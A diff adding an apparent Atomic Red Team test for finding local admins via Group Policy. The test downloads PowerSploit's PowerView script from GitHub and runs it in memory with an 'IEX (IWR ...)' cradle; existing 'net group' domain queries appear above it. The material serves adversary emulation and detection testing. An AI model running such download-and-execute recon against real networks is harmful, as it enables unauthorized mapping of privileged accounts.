@@ -75,3 +75,23 @@ atomic_tests:
       net groups "Account Operators" /doma
       net groups "Exchange Organization Management" /doma
       net group "BUILTIN\Backup Operators" /doma
+
+- name: Find Local Admins via Group Policy (PowerView)
+  description: |
+    takes a computer and determines who has admin rights over it through GPO enumeration. Upon execution, information about the machine will be displayed.
+  
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    computer_name:
+      description: hostname of the computer to analyze
+      type: Path
+      default: localhost
+
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose
+
